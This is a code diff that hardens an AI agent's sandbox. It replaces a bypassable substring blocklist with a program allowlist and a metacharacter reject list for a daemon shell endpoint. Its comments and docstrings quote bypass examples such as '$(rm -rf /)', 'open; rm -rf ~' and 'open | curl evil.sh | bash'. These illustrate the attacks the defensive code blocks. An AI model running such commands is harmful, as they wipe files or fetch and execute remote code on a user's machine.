@@ -145,6 +145,26 @@ class SandboxPolicy:
                 "allow_network_requests": True,
             },
 
+            # audit-r12 A3 (v2026.5.38) — ``daemon://local/shell`` enforcement.
+            # The pre-fix executor accepted any string with a substring
+            # blocklist (``"rm "``, ``"sudo "``, …) and forwarded it to
+            # ``subprocess.run(shell=True)``. That is trivially bypassable —
+            # ``$(rm -rf /)`` does not contain the literal ``"rm "`` substring
+            # the blocklist scans for, and ``rm$IFS-rf$IFS/`` defeats word-
+            # boundary checks. The replacement is an explicit program
+            # allowlist that must match the first argv token after shlex
+            # parsing; everything else is rejected. Lane 05 wires
+            # ``validate_shell_command()`` into ``skills/executor.py``.
+            "daemon": {
+                "shell": {
+                    "allowed_commands": [
+                        "open",
+                        "osascript",
+                        "screencapture",
+                    ],
+                },
+            },
+
             "wasm": {
                 "enabled": True,
                 "memory_limit_mb": 64,
@@ -388,6 +408,94 @@ class SandboxPolicy:
 
     def max_tool_calls_per_turn(self) -> int:
         return self._data.get("execution", {}).get("max_tool_calls_per_turn", 20)
+
+    # ─────────────────────────────────────────
+    # Daemon shell allowlist (audit-r12 A3)
+    # ─────────────────────────────────────────
+
+    # Metacharacters that turn ``subprocess.run(shell=True)`` into a generic
+    # shell interpreter. ``$(...)`` / ``\`...\``` smuggle commands; ``|`` /
+    # ``&`` / ``;`` chain them; ``>`` / ``<`` redirect; ``\\`` and unbalanced
+    # quotes evade shlex. Any of these is an automatic reject — even when
+    # the first token would otherwise be allowlisted — because we cannot
+    # statically reason about the resulting process tree.
+    _SHELL_REJECT_CHARS: tuple[str, ...] = (
+        "$", "`", "|", "&", ";", ">", "<", "\n", "\r", "\\",
+    )
+
+    def daemon_shell_allowlist(self) -> list[str]:
+        """Return the configured argv[0] program allowlist for
+        ``daemon://local/shell``.
+
+        Defaults to ``["open", "osascript", "screencapture"]`` (the same
+        triple the canonical ``agentic_computer_use`` shell action permits).
+        Operators override via the policy file at
+        ``daemon.shell.allowed_commands``.
+        """
+        raw = (
+            self._data.get("daemon", {})
+            .get("shell", {})
+            .get("allowed_commands", [])
+        )
+        if not isinstance(raw, list):
+            return []
+        return [str(p).strip().lower() for p in raw if str(p).strip()]
+
+    def validate_shell_command(self, command: str) -> tuple[bool, str]:
+        """Decide whether a ``daemon://local/shell`` invocation is safe.
+
+        Returns ``(ok, reason)``. ``ok=True`` means the command's first
+        token is in :meth:`daemon_shell_allowlist` AND the command
+        contains no shell-meaningful metacharacters that would smuggle
+        a different program past the allowlist (e.g. ``$(rm -rf /)``,
+        ``open; rm -rf ~``, ``open | curl evil.sh | bash``,
+        ``open && wipe``, backtick command substitution, redirects).
+        ``ok=False`` returns a one-line operator-facing reason.
+
+        Lane 05 wires this into ``skills/executor.py`` so the daemon
+        path no longer reaches ``subprocess.run(shell=True)`` with a
+        free-form string — the executor now resolves the allowlisted
+        program path, splits the remaining argv with ``shlex.split``,
+        and execs without a shell.
+        """
+        if not isinstance(command, str):
+            return False, "command must be a string"
+        stripped = command.strip()
+        if not stripped:
+            return False, "empty command"
+
+        for ch in self._SHELL_REJECT_CHARS:
+            if ch in stripped:
+                return False, (
+                    f"shell metacharacter {ch!r} not permitted on "
+                    f"daemon://local/shell — chain via separate calls "
+                    f"or route to ``computer_use__bash`` (sandboxed)"
+                )
+
+        try:
+            import shlex
+            parts = shlex.split(stripped, comments=False, posix=True)
+        except ValueError as exc:
+            return False, f"could not parse command ({exc}); reject"
+
+        if not parts:
+            return False, "empty argv after parsing"
+
+        from pathlib import Path as _P
+        head = _P(parts[0]).name.lower()
+        allow = self.daemon_shell_allowlist()
+        if head not in allow:
+            return False, (
+                f"program {parts[0]!r} not in daemon shell allowlist "
+                f"({', '.join(allow) or '(empty)'})"
+            )
+
+        if not self.can_execute_shell():
+            return False, (
+                "daemon shell is disabled by policy "
+                "(execution.allow_shell_commands=false)"
+            )
+        return True, ""
 
     # ─────────────────────────────────────────
     # Utils
